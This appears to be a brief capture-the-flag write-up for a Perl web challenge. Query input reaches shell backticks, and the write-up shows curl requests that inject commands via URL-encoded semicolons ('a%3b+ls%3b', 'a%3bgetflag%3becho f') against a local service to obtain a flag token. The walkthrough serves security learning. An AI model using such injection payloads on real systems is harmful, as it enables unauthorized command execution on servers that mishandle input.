analyze perl file:

google "perl backtick"

Perl runs code between backticks/quotes as shell commands

$y is linked to $_[0]; which is the first function argument
The first function argument is param("x");

Try setting x in query in url:

	$ curl localhost:4747/?x=test
	test

Try to run other commands:
	$ curl localhost:4747/?x="a; ls;"
	a

Escape semicolons and spaces:
	$ curl localhost:4747/?x="a%3b+ls%3b"
	a
	level04.pl

Assume we're running as flag04 user.

Run:
	$ curl localhost:4747/?x="a%3bgetflag%3becho f"
	a
	Check flag. Here is your token: ....
